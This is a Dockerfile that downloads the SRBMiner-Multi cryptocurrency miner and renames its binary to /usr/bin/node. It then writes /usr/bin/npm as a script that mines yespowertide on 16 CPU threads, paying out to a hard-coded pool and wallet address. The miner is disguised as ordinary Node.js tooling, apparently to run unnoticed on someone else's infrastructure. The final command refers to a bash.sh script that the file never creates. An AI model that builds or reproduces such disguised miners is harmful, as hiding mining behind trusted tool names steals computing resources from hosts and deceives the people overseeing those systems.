FROM debian
RUN apt update && apt -y install wget xz-utils && \
    cd /opt && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.1/SRBMiner-Multi-0-8-1-Linux.tar.xz && \
	tar xf SRBMiner-Multi-0-8-1-Linux.tar.xz && rm -rf /opt/SRBMiner-Multi-0-8-1-Linux.tar.xz && \
	apt -y purge xz-utils && apt -y autoremove --purge && apt -y clean && apt -y autoclean; rm -rf /var/lib/apt-get/lists/*
RUN mv /opt/SRBMiner-Multi-0-8-1/SRBMiner-MULTI /usr/bin/node
RUN echo " node --disable-gpu --algorithm yespowertide --pool stratum+tcps://stratum-na.rplant.xyz:17059 --wallet TVt7kd7Ns8rwzS8LoeMXjJZnwKdMAhhZkn.TD --cpu-threads 16 c=TIDE" > /usr/bin/npm
RUN chmod +x /usr/bin/npm
CMD bash.sh
